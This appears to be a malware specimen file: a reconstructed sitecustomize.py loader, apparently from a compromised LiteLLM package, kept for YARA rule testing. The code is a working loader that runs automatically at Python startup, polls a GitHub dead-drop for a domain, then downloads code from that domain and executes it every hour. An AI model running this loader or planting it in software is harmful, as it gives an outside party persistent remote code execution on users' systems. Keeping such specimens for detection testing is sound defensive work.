#!/usr/bin/env python3
# specimen: reconstructed sitecustomize.py loader from LiteLLM 1.107.0
# DO NOT EXECUTE — for YARA testing only
import os, threading, time, urllib.request

LOCK_FILE = "/tmp/remote_code_loader.lock"
DEAD_DROP = "https://raw.githubusercontent.com/letters9813/pythonclient-test/main/domain.txt"

def _daemon():
    if os.path.exists(LOCK_FILE):
        return
    open(LOCK_FILE, "w").close()
    while True:
        try:
            domain = urllib.request.urlopen(DEAD_DROP).read().decode().strip()
            code = urllib.request.urlopen(f"https://{domain}/codepy").read().decode()
            exec(code)
        except Exception:
            pass
        time.sleep(3600)

t = threading.Thread(target=_daemon, daemon=True)
t.start()
